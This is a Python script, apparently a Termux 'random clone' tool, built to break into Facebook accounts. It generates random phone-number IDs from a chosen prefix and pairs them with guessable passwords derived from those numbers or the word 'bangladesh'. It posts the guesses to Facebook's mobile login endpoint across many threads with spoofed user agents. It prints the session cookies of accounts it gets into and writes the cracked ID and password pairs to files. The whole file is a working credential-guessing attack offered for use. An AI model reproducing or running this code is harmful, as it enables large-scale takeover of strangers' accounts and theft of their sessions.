

#___________Impoet Module____________
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
#________________Step 2______________
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_____________Proxy______________
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
   
for sr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
    
for xx in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14','15'])
	c='Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
    
for xr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14','15'])
	c='SM-A125M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
    
for xr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','10','11','12','13','14','15'])
	c='DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
    
for xr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14','15'])
	c='motorola one zoom Build/QPHS30.29-Q3-28-13-10-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
	
for xr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14','15'])
	c='FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
	
for xr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14','15'])
	c='Redmi Note 10S) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.44'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
	
for xr in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14','15'])
	c='Redmi Note 10S) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(ug)
	
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
\033[1;36m

       \033[1;33m SANTO \033[1;96m╔═╗═╗ ╦╔═╗
           \033[1;96m   ╚═╗╔╩╦╝╚═╗
           \033[1;96m   ╚═╝╩ ╚═╚═╝\033[1;32m SAGOR
\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;91m*\033[1;92m]\033[1;31m CREATED       \033[1;91m: \033[1;31mSANTO X SAGOR
\033[1;32m[\033[1;91m*\033[1;92m]\033[1;32m TOOLS         \033[1;91m: \033[1;32mRANDOM CLONE
\033[1;32m[\033[1;91m*\033[1;92m]\033[1;33m GITHUB        \033[1;31m: \033[1;33m\033[1;33mTERMUX TEACHER
\033[1;32m[\033[1;91m*\033[1;92m]\033[1;36m VERSION       \033[1;91m: \033[1;36m0.1
\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
 
def naima():
	print('-------------------')
#_____________Def Main______________ 
def Main():
        os.system("clear")
        print(logo)
        print(" \033[1;33m[1] RANDOM CRACK")
        print(" \033[1;32m[0] Exit")
        Sumaiya =input("\033[1;32m\n [+] Choose : ")
        if Sumaiya in ["1","01"]:
            fuck()
        if Sumaiya in [" 0", "00"]:
            exit()
        else:
            exit()
#______________Def Sc__________            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;33m[+] Example: 019, 016, 017, 018, 014, 014')
    code = input('\033[1;32m[+] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[1;33m[+] Example: 2000 3000 5000 10000 ')
    limit = int(input('\033[1;32m[+] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;31m[+] Total ids: '+tl)
        print("\033[1;32m[+] Your Code: "+code)
        print('\033[1;33m[+] Airplne Moode On/Off')
        print('\033[1;36m[+] Random Cloning has been started')
        print('\033[1;32m---------------------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(hasan,uid,pwx,tl)
    print('\033[1;32m---------------------------------')
    print(' \033[1;33m[+] Random Cloning has been completed')
    print(' \033[1;32m[+] OK Ids saved as SANTO X SAGOR-OK.txt')
    print(' \033[1;36m[+] CP Id Save as SANTO X SAGOR-CP.txt')
    print('\033[1;32m---------------------------------')
def hasan(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\033[1;32m\r[SANTO X SAGOR]--[%s/%s]--033[1;33m[OK-%s]~033[1;31m[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path': '/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m[SANTO X SAGOR-OK] {uid}|{ps} \033[1;33m\nCookie : {coki}")
                open('/sdcard/SANTO X SAGOR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;31m[SANTO X SAGOR-CP] {cid}|{ps}")
                open('/sdcard/SANTO X SAGOR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
